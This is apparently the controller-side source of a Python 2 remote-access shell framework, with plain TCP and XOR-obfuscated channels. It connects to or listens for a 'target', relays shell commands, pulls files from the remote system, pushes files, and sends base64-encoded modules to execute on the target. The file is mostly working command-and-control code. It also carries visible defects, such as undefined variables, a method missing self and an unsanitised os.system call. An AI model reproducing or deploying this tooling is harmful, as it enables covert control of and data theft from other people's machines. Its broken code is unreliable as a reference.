#!/usr/bin/python

import socket
import core
import os, sys
import time
import signal
from base64 import *

socksize = 4092

class tcp:
    def __init__(self):
        signal.signal(signal.SIGINT, core.signalHandler)
        
    def download(self, filename, location):
        # downloads file from remote system
        # saves under location/filename (location should be sessiondir)
        filename = filename.replace("/","_")
        data = conn.recv(socksize)
        newfile = file(location+filename, "wb")
        newfile.write(data)
        newfile.close()
        if os.path.exists(location):
            print("[+] File saved: %s" % location)
            core.logging.info("[%s] File '%s' download sucessful." % (session, filename))
        else:
            core.downloaderr(filename, session)
            
            
    def upload(self, filename):
        if os.path.exists(filename):
            sendfile = open(filename, "r")
            filedata = sendfile.read()
            sendfile.close()
            conn.sendall(filedata)
            core.logging.info("[%s] File '%s' upload sucessful." % (session, filename))
        else:
            core.uploaderr(filename, session)
        
        
    def client(self, HOST, PORT):
        #global conn
        session = ("TCP_"+HOST)
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            conn.connect((HOST, int(PORT)))
            print("[+] Connection established!")
            print("[+] Type :help to view commands")
            sessiondir = (core.DownloadDir+session)
            os.mkdir(sessiondir)
            core.logging.info("[%s] Connection established %s:%s" % (session, HOST, PORT))
            
            while True:
                data = conn.recv(socksize)
        
                if data.startswith(":savef"):
                    dfile = core.get_choice(data)
                    if dfile != "":
                        self.download(dfile, sessiondir)
                    else:
                        core.logging.error("[%s] No file provided for [:savef] command" % session)
                
                elif data == ("Complete"):
                    print "[+] Executing module on target..."
                
                elif data == ("shell => "):
                    cmd = raw_input(data)
                    conn.sendall(str(cmd))
                
                    if cmd == (":killme"):
                        print("[!] Shutting down server!")
                        core.logging.info("[%s] Shutting down shell completely." % session)
                        conn.close()
                    
                    elif cmd.startswith(":download"):
                        dfile = core.get_choice(cmd)
                        if dfile != "":
                            self.download(dfile, sessiondir)
                            self.handle(conn)
                        else:
                            core.inputerr()
                    
                    elif cmd.startswith(":upload"):
                        fname = core.get_choice(cmd)
                        if fname != "":
                            self.upload(fname)
                            self.handle(conn)
                        else:
                            core.inputerr()
                    
                    elif cmd.startswith(":exec"):
                        modname = core.get_choice(cmd)
                        if modname != "":
                            if os.path.exists(core.ModulesDir+modname):
                                sendfile = open(core.ModulesDir+modname, "rb")         # read the file into buffer
                                filedata = sendfile.read()
                                sendfile.close()
                                time.sleep(3)
                                filedata = b64encode(filedata)                  # base64 encode file and send to server
                                conn.sendall(filedata)
                                core.logging.info("[%s] Executing module %s" % (session, modname))
                                data = conn.recv(socksize)
                            else:
                                print("[!] module not found!")
                            
                        else:
                            core.inputerr()
                        
                    elif cmd == (":help"):
                        core.shell_help()
                    
                    elif cmd.startswith(":info"):
                        modname = core.get_choice(cmd)
                        if modname != "":
                            core.module_info(modname)
                        else:
                            core.inputerr()
                                
                    elif cmd == (":mods"):
                        print("[+] Available Modules: ")
                        print core.Modules
                        
                    elif cmd == (":files"):
                        print("\n[+] Contents of Storage directory: ")
                        os.system("ls %s" % sessiondir)
                    
                    elif cmd == (":quit"):
                        print("[!] Closing shell connection.")
                        core.logging.info("Closing connection to %s" % name)
                        conn.close()
                    
                elif data:
                    print data
                
            conn.close()

        except:
            core.socketerr(session)        
                
            
    def server(self, HOST, PORT):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        session = ("TCP_"+HOST)
        
        try:
            server.bind((HOST, int(PORT)))
            server.listen(5)
            print("Listening on port %s.." % PORT)
            global conn
            conn, addr = server.accept()
            print("New Connection!")
            core.logging.info("[%s] Connection established => %s:%s" % (session, HOST, PORT))
            
            while True:
                data = conn.recv(socksize)
        
                if data.startswith(":savef"):
                    dfile = core.get_choice(data)
                    if dfile != "":
                        core.logging.info("[%s] Saving %s " % (session, dfile))
                        self.download(dfile, sessiondir)
                    else:
                        core.logging.info("[%s] No file specified for :savef" % session)
                
                elif data == ("Complete"):
                    print "[+] Executing module on target..."
                
                elif data == ("shell => "):
                    cmd = raw_input(data)
                    conn.sendall(str(cmd))
                
                    if cmd == (":killme"):
                        print("[!] Shutting down server!")
                        core.logging.info("[%s] Shutting down shell completely." % session)
                        conn.close()
                    
                    elif cmd.startswith(":download"):
                        dfile = core.get_choice(cmd)
                        if dfile != "":
                            self.download(dfile, sessiondir)
                        else:
                            core.inputerr()
                    
                    elif cmd.startswith(":upload"):
                        fname = core.get_choice(cmd)
                        if fname != "":
                            self.upload(fname)
                        else:
                            core.inputerr()
                    
                    elif cmd.startswith(":exec"):
                        modname = core.get_choice(cmd)
                        if modname != "":
                            if os.path.exists(core.ModulesDir+modname):
                                sendfile = open(core.ModulesDir+modname, "rb")         # read the file into buffer
                                filedata = sendfile.read()
                                sendfile.close()
                                time.sleep(3)
                                filedata = b64encode(filedata)                  # base64 encode file and send to server
                                conn.sendall(filedata)
                                core.logging.info("[%s] Executing module %s" % (session, modname))
                                data = conn.recv(socksize)
                            else:
                                print("[!] module not found!")
                            
                        else:
                            core.inputerr()
                        
                    elif cmd == (":help"):
                        core.shell_help()
                    
                    elif cmd.startswith(":info"):
                        modname = core.get_choice(cmd)
                        if modname != "":
                            core.module_info(modname)
                        else:
                            core.inputerr()
                                
                    elif cmd == (":mods"):
                        print("[+] Available Modules: ")
                        print core.Modules
                        
                    elif cmd == (":files"):
                        print("\n[+] Contents of Storage directory: ")
                        os.system("ls %s" % sessiondir)
                    
                    elif cmd == (":quit"):
                        print("[!] Closing shell connection.")
                        core.logging.info("[%s] Closing connection." % session)
                        conn.close()
                    
                elif data:
                    print data
                
            conn.close()

        except:
            core.socketerr(session) 



class xor:
    def __init__(self):
        signal.signal(signal.SIGINT, core.signalHandler)   
        
        
    def enc(string, key):
        data = ''
        for char in string:
            for ch in key:
                char = chr(ord(char) ^ ord(ch))
            data += char
        return data
        
           
    def download(self, filename, location):
        # downloads file from remote system
        # saves under location/filename (location should be sessiondir)
        filename = filename.replace("/","_")
        data = conn.recv(socksize)
        newfile = file(location+filename, "wb")
        newfile.write(data)
        newfile.close()
        if os.path.exists(location):
            print("[+] File saved: %s" % location)
            core.logging.info("[%s] File '%s' download sucessful." % (session, filename))
        else:
            core.downloaderr(filename, session)
            
            
    def upload(self, filename):
        if os.path.exists(filename):
            sendfile = open(filename, "r")
            filedata = sendfile.read()
            sendfile.close()
            conn.sendall(filedata)
            core.logging.info("[%s] File '%s' upload sucessful." % (session, filename))
        else:
            core.uploaderr(filename, session)
            
            
    def client(self, HOST, PORT, pin):
        session = ("XOR_"+HOST)
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            conn.connect((HOST, PORT))
            sessiondir = (core.DownloadDir+session)
            os.mkdir(sessiondir)
            print("[+] Connection established!")
            print("[+] Type :help to view commands")
            core.logging.info("[%s] Connection established => %s:%s" % (session, HOST, PORT))
        
            while True:
                xdata = conn.recv(socksize)
                data = self.enc(xdata, pin)
            
                if data.startswith(":savef"):
                    dfile = core.get_choices(data)
                    if dfile != "":
                        self.download(dfile, sessiondir)
                    else:
                        core.logging.info("[%s] No file given for :savef" % session)

                elif data == ("Complete"):
                    print "[+] Module transfer successful."
                    print "[+] Executing module on target..."
                
                elif data == "shell => ":
                    cmd = raw_input(data)
                    xcmd = self.enc(cmd, pin)
                    conn.sendall(xcmd)
                
                    if cmd == (":killme"):
                        print("[!] Shutting down server!")
                        conn.close()
                    
                    elif cmd == (":quit"):
                        print("[!] Closing shell connection!")
                        conn.close()
                    
                    elif cmd.startswith(":download"):
                        dfile = core.get_choice(cmd)
                        if dfile != "":
                            self.download(dfile, sessiondir)
                        else:
                            core.inputerr()
                    
                    elif cmd.startswith(":upload"):
                        fname = core.get_choice(cmd)
                        if fname != "":
                            self.upload(fname)
                        else:
                            core.inputerr()
                    
                    elif cmd.startswith(":exec"):
                        modname = core.get_choice(cmd)
                        if modname != "":
                            if os.path.exists(ModulesDir+modname):
                                sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
                                filedata = sendfile.read()
                                sendfile.close()
                                time.sleep(3)
                                filedata = b64encode(filedata)                  # base64 encode file and send to server
                                conn.sendall(filedata)
                                data = conn.recv(socksize)                    # wait to receive the OK msg from server
                            else:
                                print("[!] module not found!")
                        else:
                            core.inputerr()
                        
                    elif cmd == (":help"):
                        core.shell_help()
                    
                    elif cmd.startswith(":info"):
                        modname = core.get_choice(cmd)
                        if modname != "":
                            core.module_info(modname)
                        else:
                            core.inputerr()
                                
                    elif cmd == (":mods"):
                        print("[+] Available Modules: ")
                        print core.Modules
                        
                    elif cmd == (":files"):
                        print("\n[+] Contents of Storage directory: ")
                        os.system("ls %s" % sessiondir)
                        
                elif data:
                    print data
                
            conn.close()
        
        except:
            core.socketerr(session)


    def server(self, HOST, PORT, pin):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            server.bind((HOST, int(PORT)))
            server.listen(5)
            print("Listening on port %s.." % PORT)
            global conn
            conn, addr = server.accept()
            print("New Connection!")
            core.logging.info("[%s] Connection established => %s:%s" % (session, HOST, PORT))
        
            while True:
                xdata = conn.recv(socksize)
                data = self.enc(xdata, pin)
            
                if data.startswith(":savef"):
                    dfile = core.get_choices(data)
                    if dfile != "":
                        self.download(dfile, sessiondir)
                    else:
                        core.logging.info("[%s] No file given for :savef" % session)

                elif data == ("Complete"):
                    print "[+] Module transfer successful."
                    print "[+] Executing module on target..."
                
                elif data == "shell => ":
                    cmd = raw_input(data)
                    xcmd = self.enc(cmd, pin)
                    conn.sendall(xcmd)
                
                    if cmd == (":killme"):
                        print("[!] Shutting down server!")
                        conn.close()
                    
                    elif cmd == (":quit"):
                        print("[!] Closing shell connection!")
                        conn.close()
                    
                    elif cmd.startswith(":download"):
                        dfile = core.get_choice(cmd)
                        if dfile != "":
                            self.download(dfile, sessiondir)
                        else:
                            core.inputerr()
                    
                    elif cmd.startswith(":upload"):
                        fname = core.get_choice(cmd)
                        if fname != "":
                            self.upload(fname)
                        else:
                            core.inputerr()
                    
                    elif cmd.startswith(":exec"):
                        modname = core.get_choice(cmd)
                        if modname != "":
                            if os.path.exists(ModulesDir+modname):
                                sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
                                filedata = sendfile.read()
                                sendfile.close()
                                time.sleep(3)
                                filedata = b64encode(filedata)                  # base64 encode file and send to server
                                conn.sendall(filedata)
                                data = conn.recv(socksize)                    # wait to receive the OK msg from server
                            else:
                                print("[!] module not found!")
                        else:
                            core.inputerr()
                        
                    elif cmd == (":help"):
                        core.shell_help()
                    
                    elif cmd.startswith(":info"):
                        modname = core.get_choice(cmd)
                        if modname != "":
                            core.module_info(modname)
                        else:
                            core.inputerr()
                                
                    elif cmd == (":mods"):
                        print("[+] Available Modules: ")
                        print core.Modules
                        
                    elif cmd == (":files"):
                        print("\n[+] Contents of Storage directory: ")
                        os.system("ls %s" % sessiondir)
                        
                elif data:
                    print data
                
            conn.close()
        
        except:
            core.socketerr(session)

tcp = tcp()
xor = xor()
